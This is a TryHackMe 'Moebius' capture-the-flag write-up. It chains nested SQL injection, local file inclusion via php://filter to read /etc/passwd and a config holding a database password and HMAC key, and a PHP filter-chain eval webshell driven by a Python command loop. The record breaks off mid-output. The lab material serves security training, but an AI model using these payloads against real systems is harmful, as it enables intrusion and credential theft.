---
title: "TryHackMe: Moebius"
author: NeoVirex
categories: [TryHackMe]
tags: [thm]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_moebius/
image:
  path: room_img.png
description: "A place where you start at some point, and you have to go back to it in the end."
---
# Moebius

Created: April 26, 2025 3:09 PM
Status: Not started

## Reconnaissance && Service Enumeration

### Rustscan >> open port’s

```jsx
Open 10.10.22.231:22
Open 10.10.22.231:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 15:11 EDT
Initiating Ping Scan at 15:11
Scanning 10.10.22.231 [4 ports]
Completed Ping Scan at 15:11, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:11
Completed Parallel DNS resolution of 1 host. at 15:11, 0.05s elapsed
DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:11
Scanning 10.10.22.231 [2 ports]
Discovered open port 80/tcp on 10.10.22.231
Discovered open port 22/tcp on 10.10.22.231
Completed SYN Stealth Scan at 15:11, 0.16s elapsed (2 total ports)
Nmap scan report for 10.10.22.231
Host is up, received echo-reply ttl 63 (0.14s latency).
Scanned at 2025-04-26 15:11:02 EDT for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)

       
```

### nmap >> versions , server running

```jsx
└─$ nmap -p22,80 10.10.22.231 -sV -A
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 15:14 EDT
Nmap scan report for 10.10.22.231
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Image Grid
|_http-server-header: Apache/2.4.62 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   148.82 ms 10.23.0.1
2   148.90 ms 10.10.22.231

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
                        
```

## Web Application Analysis

**Burp Suite,  OWASP ZAP,   Nikto,   Wapiti,    Dirbuster**

```jsx
└─$ ffuf -u http://10.10.22.231/FUZZ -w /usr/share/wordlists/dirb/common.txt

        /'___\  /'___\           /'___\       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.22.231/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 138ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 139ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 134ms]
                        [Status: 200, Size: 898, Words: 107, Lines: 25, Duration: 157ms]
index.php               [Status: 200, Size: 898, Words: 107, Lines: 25, Duration: 221ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 223ms]
:: Progress: [4614/4614] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
                 
```

![Screenshot From 2025-04-29 12-03-46.png](img1.png)

![Screenshot From 2025-04-29 12-02-44.png](img2.png)

## Vulnerability Scanning

[Exploit-DB,](https://www.exploit-db.com/)        [CVE Details,](https://www.cvedetails.com/)    [ZeroDay Initiative (ZDI),](https://www.zerodayinitiative.com/)           [Exploit Tracker,](https://www.exploittracker.net/)          [Metasploit Exploit Database](https://docs.metasploit.com/docs/using-metasploit/interfacing/metasploit-module-library.html)

### Nested SQL Injection

First of all, we know that the query we inject into, **`SELECT id from albums where short_tag = '<short_tag>'`**, simply fetches the album `id` from the `albums` table. However, if we look at the output of **album.php** with a valid `short_tag`, we can see that the page also displays the `paths` for the images, which are stored in the `images` table.

We don’t know if the application exactly works this way, but we can simply test it. First, using a payload like `jxf' UNION SELECT 0-- -` on the `short_tag` variable for **album.php** with the request `http://10.10.152.169/album.php?short_tag=jxf' UNION SELECT 0-- -`, we can see that we are able to control the `album_id` returned by the query.

![image.png](img3.png)

Now, instead of an `id`, with a payload like `jxf' UNION SELECT "0 OR 1=1-- -"-- -`, we can make the first query return **`0 OR 1=1-- -`** 

![Screenshot From 2025-05-01 05-03-07.png](img4.png)

![Screenshot From 2025-05-01 05-19-37.png](img5.png)

![Screenshot From 2025-05-01 05-10-17.png](img6.png)

Now, trying to set the `path` as `/etc/passwd` to force **album.php** to calculate the hash for this path and use it at **/image.php** to read it, with the payload `jxf' UNION SELECT "0 UNION SELECT 1,2,'/etc/passwd'-- -"-- -`, we once again encounter the **Hacking attempt** error, as `/` is a filtered character.

![Screenshot From 2025-05-01 05-07-51.png](img7.png)

## successfully able to include the `/etc/passwd` file download and read its contents.

```jsx
└─$ ls
image.php
                                                                             
┌──(neo㉿neo)-[~/pro/m]
└─$ cat image.php   
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
                                                                             
┌──(neo㉿neo)-
```

### Reading Application Files

```jsx
php://filter/convert.base64-encode/resource=
```

```jsx
first the file place >>>>> php://filter/convert.base64-encode/resource=album.php
```

```jsx
encrypted by base64 >>>>>    7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d616c62756d2e706870
```

![Screenshot From 2025-05-01 05-41-03.png](img8.png)

## `$ curl -s 'http://10.10.152.169/image.php?hash=ec6e518b7e39db98affbf2bf2c671d469639503d4fee97bf7cf0f0a1319075d9&path=php://filter/convert.base64-encode/resource=album.php' | base64 -d`

```jsx
$ curl -s 'http://10.10.152.169/image.php?hash=ec6e518b7e39db98affbf2bf2c671d469639503d4fee97bf7cf0f0a1319075d9&path=php://filter/convert.base64-encode/resource=album.php' | base64 -d
```

```jsx
...
<?php

include('dbconfig.php');

try {
    // Create a new PDO instance
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);

    // Set PDO error mode to exception
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    if (preg_match('/[\/;]/', $_GET['short_tag'])) {
        // If it does, terminate with an error message
        die("Hacking attempt");
    }

    $album_id = "SELECT id from albums where short_tag = '" . $_GET['short_tag'] . "'";
    $result_album = $conn->prepare($album_id);
    $result_album->execute();

    $r=$result_album->fetch();
    $id=$r['id'];

    // Fetch image IDs from the database
    $sql_ids = "SELECT * FROM images where album_id=" . $id;
    $stmt_path= $conn->prepare($sql_ids);
    $stmt_path->execute();

    // Display the album id
    echo "<!-- Short tag: " . $_GET['short_tag'] . " - Album ID: " . $id . "-->\n";
    // Display images in a grid
    echo '<div class="grid-container">' . "\n";
    foreach ($stmt_path as $row) {
        // Get the image ID
        $path = $row["path"];
        $hash = hash_hmac('sha256', $path, $SECRET_KEY);

        // Create link to image.php with image ID
        echo '<div class="image-container">' . "\n";
        echo '<a href="/image.php?hash='. $hash . '&path=' . $path . '">';
        echo '<img src="/image.php?hash='. $hash . '&path=' . $path . '" alt="Image path: ' . $path . '">';
...
```

## Reading the source code of `album.php`, we see that the application calculates hashes using HMAC-SHA256:

```jsx
$hash = hash_hmac('sha256', $path, $SECRET_KEY);
```

However, the `SECRET_KEY` is not defined inside `album.php` — instead, it includes `dbconfig.php`, so it is most likely that the key is defined there.

To retrieve dbconfig.php, we repeat the same method: hex-encode the path and create another payload:

This allows us to fetch the hash for `php://filter/convert.base64-encode/resource=dbconfig.php`.

```jsx
jxf' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d6462636f6e6669672e706870-- -"-- -
```

```jsx
└─$ cat dbconfig.php 
PD9waHAKLy8gRGF0YWJhc2UgY29ubmVjdGlvbiBzZXR0aW5ncwokc2VydmVybmFtZSA9ICJkYiI7CiR1c2VybmFtZSA9ICJ3ZWIiOwokcGFzc3dvcmQgPSAiVEFKbkY2WXVJb3Q4M1gzZyI7CiRkYm5hbWUgPSAid2ViIjsKCgokU0VDUkVUX0tFWT0nYW44aDZvVGxOQjlOMEhOY0pNUFlKV3lwUFIyNzg2SVE0STN3b1BBMUJxb0o3aHpJUzBxUVdpMkVLbUp2QWdPVyc7Cj8+                                                                    
┌──(neo㉿neo)-[~/pro/m]
┌──(neo㉿neo)-[~/pro/m]
└─$ cat dbconfig.php | base64 -d
<?php
// Database connection settings
$servername = "db";
$username = "web";
$password = "TAJnF6YuIot83X3g";
$dbname = "web";

$SECRET_KEY='an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW';
?>                                                                    

```

### Now that we have the `SECRET_KEY`, we can easily calculate valid HMAC-SHA256 hashes for any path we want. Here’s a simple Python script to automate this:

```jsx
import hmac
import hashlib
import sys

secret_key = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"
path = sys.argv[1].encode()
h = hmac.new(secret_key, path, hashlib.sha256)
signature = h.hexdigest()
print(signature)
```

```jsx
└─$ python3 hash.py 'php://filter/convert.base64-encode/resource=image.php'    
ddc6eb77667e8f2dc36eeea2cb0883eb1ede14e6f6e32b6244256040dacfe5c6                                                                
┌──(neo㉿neo)-[~/pro/m]
└─$ 
```

```jsx
└─$ curl -s 'http://10.10.97.40/image.php?hash=ddc6eb77667e8f2dc36eeea2cb0883eb1ede14e6f6e32b6244256040dacfe5c6&path=php://filter/convert.base64-encode/resource=image.php' | base64 -d 
<?php

include('dbconfig.php');

    // Create a new PDO instance
    
    // Set PDO error mode to exception
    
    // Get the image ID from the query string
    
    // Fetch image path from the database based on the ID
    
    // Fetch image path
    $image_path = $_GET['path'];
    $hash= $_GET['hash'];

    $computed_hash=hash_hmac('sha256', $image_path, $SECRET_KEY);

    
    if ($image_path && $computed_hash === $hash) {
        // Get the MIME type of the image
        $image_info = @getimagesize($image_path);
        if ($image_info && isset($image_info['mime'])) {
            $mime_type = $image_info['mime'];
            // Set the appropriate content type header
            header("Content-type: $mime_type");
            
            // Output the image data
            include($image_path);
        } else {
            header("Content-type: application/octet-stream");
            include($image_path);
        }
    } else {
        echo "Image not found";
    }

?>

```

### they are vulnerable to Local File Inclusion (LFI)

```

Warning: Trying to access array offset on false in /var/www/html/album.php on line 32
Connection failed: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
```

- └─$ sqlmap -u 'http://moebius.thm/album.php?short_tag=
    
    ```
    └─$ sqlmap -u 'http://moebius.thm/album.php?short_tag='
            ___
           __H__
     ___ ___["]_____ ___ ___  {1.9.2#stable}
    |_ -| . [)]     | .'| . |
    |___|_  [']_|_|_|__,|  _|
          |_|V...       |_|   https://sqlmap.org
    
    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
    
    [*] starting @ 12:08:49 /2025-04-29/
    
    [12:08:49] [WARNING] provided value for parameter 'short_tag' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
    [12:08:49] [INFO] testing connection to the target URL
    [12:08:49] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
    [12:08:49] [INFO] checking if the target is protected by some kind of WAF/IPS
    [12:08:49] [INFO] testing if the target URL content is stable
    [12:08:50] [INFO] target URL content is stable
    [12:08:50] [INFO] testing if GET parameter 'short_tag' is dynamic
    [12:08:50] [WARNING] GET parameter 'short_tag' does not appear to be dynamic
    [12:08:50] [INFO] heuristic (basic) test shows that GET parameter 'short_tag' might be injectable (possible DBMS: 'MySQL')
    [12:08:50] [INFO] heuristic (XSS) test shows that GET parameter 'short_tag' might be vulnerable to cross-site scripting (XSS) attacks
    [12:08:50] [INFO] testing for SQL injection on GET parameter 'short_tag'
    it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
    for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
    [12:09:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [12:09:15] [WARNING] reflective value(s) found and filtering out
    [12:09:16] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
    [12:09:16] [INFO] testing 'Generic inline queries'
    [12:09:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
    [12:09:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
    [12:09:26] [INFO] GET parameter 'short_tag' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --not-string="32")                                     
    [12:09:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                             
    [12:09:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
    [12:09:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                                                         
    [12:09:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
    [12:09:27] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                                                                 
    [12:09:27] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
    [12:09:27] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                                                                 
    [12:09:27] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
    [12:09:27] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                       
    [12:09:27] [INFO] GET parameter 'short_tag' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                                                       
    [12:09:27] [INFO] testing 'MySQL inline queries'
    [12:09:27] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
    [12:09:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
    [12:09:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
    [12:09:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
    [12:09:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
    [12:09:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
    [12:09:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
    [12:09:39] [INFO] GET parameter 'short_tag' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                                                           
    [12:09:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
    [12:09:39] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
    [12:09:39] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
    [12:09:43] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
    [12:09:46] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
    [12:09:49] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
    [12:09:53] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
    [12:09:56] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
    [12:10:00] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
    [12:10:03] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
    [12:10:06] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
    [12:10:10] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
    [12:10:13] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval                                  
    GET parameter 'short_tag' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
    sqlmap identified the following injection point(s) with a total of 288 HTTP(s) requests:
    ---
    Parameter: short_tag (GET)
        Type: boolean-based blind
        Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
        Payload: short_tag=-3586' OR 5137=5137#
    
        Type: error-based
        Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
        Payload: short_tag=' AND (SELECT 5955 FROM(SELECT COUNT(*),CONCAT(0x716b627671,(SELECT (ELT(5955=5955,1))),0x71786b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- rctT
    
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: short_tag=' AND (SELECT 5502 FROM (SELECT(SLEEP(5)))nEsN)-- JLHV
    ---
    [12:14:46] [INFO] the back-end DBMS is MySQL
    [12:14:46] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
    web server operating system: Linux Debian
    web application technology: PHP 8.4.4, Apache 2.4.62
    back-end DBMS: MySQL >= 5.0 (MariaDB fork)
    [12:14:48] [INFO] fetched data logged to text files under '/home/neo/.local/share/sqlmap/output/moebius.thm'                                                                                        
    
    [*] ending @ 12:14:48 /2025-04-29/
    ```
    

### We see that the parameter is vulnerable to three different SQL injection variants:
boolean-based blind
error-based
ime-based blind

[Moebius | Writeups](https://0xb0b.gitbook.io/writeups/tryhackme/2025/moebius)

## Exploit & Initial Access

### Reverse Shell Generators writeup

### 🐚 **Reverse Shell Generators**

- [**Reverse Shell Generator**](https://www.revshells.com/) – Quick reverse shell one-liner generator.
- [**Pentestmonkey Reverse Shell Cheatsheet**](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) – Classic shell one-liners for various languages.
- [**Nishang Shell Generator**](https://github.com/samratashok/nishang) – PowerShell reverse shells (see `Invoke-PowerShellTcp`).
- [**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings) – Collection of useful payloads and bypasses.
- [**Shells.cloud**](https://shells.cloud/) *(if available)* – Online reverse shell generator (mirror of revshells sometimes).

### To turn this **LFI** vulnerability into **RCE**, another method besides log poisoning is to use **PHP filters chain**

We can generate a filter chain using by **Synacktiv**: 

[https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

```jsx
└─$ python3 ./php_filter_chain_generator.py --chain '<?=eval($_GET[0])?>'
[+] The following gadget chain will generate the following code : <?=eval($_GET[0])?> (base64 value: PD89ZXZhbCgkX0dFVFswXSk/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
                                                                                      
┌──(neo㉿neo)-[~/pro/m/php_filter_chain_generator]

```

### executable code

```jsx
import hmac
import hashlib
import requests

target_url = "http://10.10.97.40/image.php" # change the IP address

secret_key = b"an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW"
path = "php://filter/convert.iconv.UTF8.CSISO2022KR|    put the generated code form above   |convert.base64-decode/resource=php://temp".encode() # replace with the output of php_filter_chain_generator.py 
h = hmac.new(secret_key, path, hashlib.sha256)
signature = h.hexdigest()

while True:
    params = {
        "hash": signature,
        "path": path,
        "0": input("code> ")
    }
    resp = requests.get(target_url, params=params, timeout=5)
    text = resp.text
    print(text)
```

running the script 

```jsx
$ python3 execute_code.py                                          
code> system('id')
<br />
<b>Parse error</b>:  syntax error, unexpected end of file in <b>php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64